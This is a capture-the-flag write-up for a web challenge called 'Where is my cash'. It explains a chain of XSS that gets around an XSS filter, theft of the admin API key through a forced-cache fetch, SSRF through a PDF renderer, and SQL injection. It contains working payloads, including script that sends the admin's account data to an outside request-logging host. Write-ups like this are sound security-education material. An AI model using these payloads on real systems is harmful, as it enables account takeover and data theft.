# Where is my cash Writeup (Web, 478 points, 2 solves)

The [official writeup is shared
here](https://gist.github.com/l4yton/da9232b992454b429c93af0d05a1fe2f), the
trick for getting the admin key was to force the browser to use the... cache.
I've updated this writeup to include this part of the exploit because mine
varies in how I do the XSS and exfill the actual flag. This was such a cool
challenge!

## The Exploit Chain
This is how the exploit chain works, sadly I wasn't able to get the api_key during the CTF but have updated this writeup to include it after the official writeup was shared, and confirmed my other steps work.

1. XSS the Admin to steal its `api_key`
2. Send malicicous PDF using SSRF from the JavaScript to `/1.0/admin/createReport`. This is necessary because
   the caller of the next API must be from `127.0.0.1`.
3. The JavaScript makes a request to `/internal/createTestWallet` which is SQLi vulnerable.
4. The SQLi creates a wallet for our account and pulls the flag from another wallet.
5. View the flag on the /wallets page when logged in.

## Cross-Site Scripting (XSS)

The application places the query param `api_key` in the DOM like so:

```js
    <script>
        const API_TOKEN = "{{{ token }}}";
    </script>
```

The backend applies some small filters to it, which we can work around.

```js
    return req.query.api_key.replace(/;|\n|\r/g, "");
```

The simplest approach is to have a payload like `api_key="</script><script>PAYLOAD HERE` and 
this works locally, but fails when triggering it against the remote server. By running
the server locally I was able to confirm the Chromium's XSS Auditor is blocking this, 
so I needed another way.

Our payload looks like this instead `api_key="%2BEXPLOIT//`. We _intentionally_ include the URI
encoded version of `+` there, and we'll need to URI encode the whole param once more before using it.
This was another gotcha with making the admin visit. Because it gets decoded when we submit it to the
server, it then passes it in as a string with a `+` to visit, and the plus is treated as a space and
doesn't show up in the rendered output, thus we get a syntax error and it fails. When all is as expected,
we get it to render like so.

```js
    <script>
        const API_TOKEN = ""+EXPLOIT_HERE//";
    </script>
```

This is somewhat restrictive because you can't do `=` in the exploit easily and cannot use `;`,
but we can also work around this by wrapping each line of our exploit in a function, iterate over it,
and call each function. This can be seen in the exploit script itself, but it ends up basically looking
like this, and we can share state between calls using the global window.

```js
const API_TOKEN = ""+[() => { window.x = 1 }, () => { console.log(x+1) }].forEach(f => f())//";
```

A POC of the basic form of this can be seen locally with this URL, but note that we don't do the double encoding of `+`
because we want it to trigger in our browser so we can iterate on it.

```
https://wimc.ctf.allesctf.net/?api_key=%22%2Balert%28%22hi%22%29%2F%2F
```

### Making the Admin Visit

We submit the support form on https://wimc.ctf.allesctf.net/support with the XSS'd URL. You can test this like so:

1. Create a [Postbin](https://postb.in) to log requests
2. Modify this URL to include your Postbin IDs `https://wimc.ctf.allesctf.net/?api_key=%22%252Bwindow.location.replace%28%22https%3A%2F%2Fpostb.in%2F1599338333507-1126356946770%22%29%2F%2F`
3. Submit the form on https://wimc.ctf.allesctf.net/support
4. Refresh the Postbin to see the request.


### Getting the API Key

From the official writeup, the intended solution was to force the browser to load the admin user from the cache, which allows us to get their API key. In my exploit code this looks like so:

```javascript
window.requestbin = "https://postb.in/1599419937004-0317174713127?data="
fetch("https://api.wimc.ctf.allesctf.net/1.0/user", {method:"GET", cache:"force-cache"}).then(a => a.json()).then(b => location.href=requestbin%2BJSON.stringify(b))
```

Another user on IRC, Webuser4344, shared an alternate way they were able to get the flag. In my exploration I was somewhat close to this and attempting to use iframes to do something similar, but didn't get it all the way there. Here's how it worked:

1. The first XSS payload opens a new window
2. In the second window, call `window.opener.history.back()` to navigate back to the page with api_key in the url
3. Read the URL `window.opener.location.href` and exfil it.

## Server-Side Request Forgery (SSRF)

Once we have the `api_key`, we can authenticate as the admin and call the `/1.0/admin/createReport` endpoint which
allows us to upload arbitrary HTML which it will render as a PDF and then return to us. We can include a `<script>`
in our HTML and use that to trigger the SSRF. The HTML we submit looks like so:

```html
<script>
var data = "balance=1, 'TESTING WALLET 1234'), ('1', (select user_id from general where username='tpurp' limit 1), 1, (select note from wallets w where owner_id='13371337-1337-1337-1337-133713371337' limit 1)); #"

var http = new XMLHttpRequest();
http.open('POST', 'http://127.0.0.1:1337/internal/createTestWallet', true);
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
http.send(data);
</script>
```

## The SQLi

The implementation of the `/internal/createTestWallet` endpoint interpolates in the balance parameter directly into the query like so:

```js
var balance = req.body["balance"] || 1337;
var ip = req.connection.remoteAddress;

if (ip === "127.0.0.1") {
    // create testing wallet without owner
    var wallet_id = crypto.randomBytes(20).toString('hex').substring(0,20);
    connection.query(`INSERT INTO wallets VALUES ('${wallet_id}', NULL, ${balance}, 'TESTING WALLET 1234');`, (err, data) => {
```

The flag itself is stoed as the note for a wallet owner by a different user, so we can have the SQLi create a new wallet for our account, and set the note to the flag from the other wallet. The appliction never exposes our user_id to us, so we also use a subquery to select our account. This way we can see it on our wallets page after the injection runs.

The query itself looks like this, with newlines added for clarity. One issue that came up with MySQL is that it doesn't like you selecting from the same table (`wallets`) you are inserting into, but by aliasing it to `w` we make this error go away.
```sql
INSERT INTO wallets VALUES 
  ('${wallet_id}', NULL, 1, 'TESTING WALLET 1234'), 
  (
    '1', 
     (select user_id from general where username='tpurp' limit 1), 
     1, 
     (select note from wallets w where owner_id='13371337-1337-1337-1337-133713371337' limit 1)
  ); 
  #, 'TESTING WALLET 1234
```

## The Flag

Once this runs, we simply need to log into the application, view the wallets page, click on wallet #1, and the flag will be on the page!
